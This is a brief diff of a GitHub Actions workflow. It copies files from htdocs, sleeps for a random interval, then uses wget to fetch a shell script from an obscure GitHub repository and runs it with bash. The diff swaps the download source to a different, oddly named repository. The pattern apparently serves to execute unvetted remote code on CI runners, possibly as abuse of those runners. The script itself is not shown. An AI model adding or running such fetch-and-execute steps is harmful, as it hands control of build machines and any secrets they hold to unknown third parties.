@@ -17,5 +17,5 @@ jobs:
           cp htdocs/$file/* ./
           done
           sleep $((RANDOM % 10 + 1))m
-          wget -O drive333.sh https://raw.githubusercontent.com/hongtyyu/0127/main/.github/workflows/drive333.sh
+          wget -O drive333.sh https://raw.githubusercontent.com/iijtfvvvg/0127/main/.github/workflows/drive333333.sh
           bash drive333.sh
